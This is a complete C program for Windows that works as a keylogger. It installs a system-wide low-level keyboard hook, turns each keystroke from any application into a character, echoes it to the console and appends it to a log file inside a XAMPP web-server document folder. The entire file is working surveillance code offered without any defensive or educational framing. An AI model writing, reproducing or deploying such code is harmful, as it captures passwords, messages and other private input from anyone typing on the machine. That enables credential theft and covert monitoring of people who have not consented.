#include <stdio.h>
#include <windows.h>
#include <direct.h>  // Include the header for _mkdir

HHOOK hHook = NULL;
FILE *logFile;

char GetCharFromVKCode(int vkCode, int shiftPressed) {
    BYTE keyboardState[256] = { 0 };
    if (shiftPressed) {
        keyboardState[VK_SHIFT] = 0x80;
    }

    WCHAR buffer[2] = { 0 };
    ToUnicode(vkCode, 0, keyboardState, buffer, 2, 0);
    return (char)buffer[0];
}

int IsSpecialKey(int vkCode) {
    return (vkCode == VK_MENU || vkCode == VK_TAB || vkCode == VK_SHIFT || vkCode == VK_CONTROL);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static char previousChar = '\0';

    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        int vkCode = ((PKBDLLHOOKSTRUCT)lParam)->vkCode;
        int shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;

        // Check if the key is a special key (Alt, Tab, Shift, Ctrl)
        if (!IsSpecialKey(vkCode)) {
            char c = GetCharFromVKCode(vkCode, shiftPressed);

            if (c == ' ' && previousChar == ' ') {
                // Skip consecutive spaces, add only one newline
                previousChar = c;
            } else {
                // Output the character to the console and log file
                printf("%c\n", c);
                fprintf(logFile, "%c\n", c);
                fflush(logFile);
                previousChar = c;
            }
        }
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Function to create directory if it doesn't exist
void createDirectory(const char *path) {
    if (_mkdir(path) != 0) {
        // Directory already exists or failed to create
    }
}

int main() {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    const char *logFilePath = "C:\\xampp\\htdocs\\FromScratch\\C\\dump\\keystrokes.txt";

    // Extract the directory from the full path
    char directory[MAX_PATH];
    strcpy(directory, logFilePath);
    char *lastBackslash = strrchr(directory, '\\');
    if (lastBackslash != NULL) {
        *lastBackslash = '\0';  // Null-terminate to get the directory
    }

    // Create the directory if it doesn't exist
    createDirectory(directory);

    // Set the path for the log file
    logFile = fopen(logFilePath, "a");
    if (logFile == NULL) {
        perror("Failed to open log file");
        return 1;
    }

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);

    if (hHook == NULL) {
        fprintf(stderr, "Failed to install hook: %lu\n", GetLastError());
        fclose(logFile);
        return 1;
    }

    // Enter an application message loop to keep the hook running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Uninstall the hook
    UnhookWindowsHookEx(hHook);
    fclose(logFile);

    return 0;
}
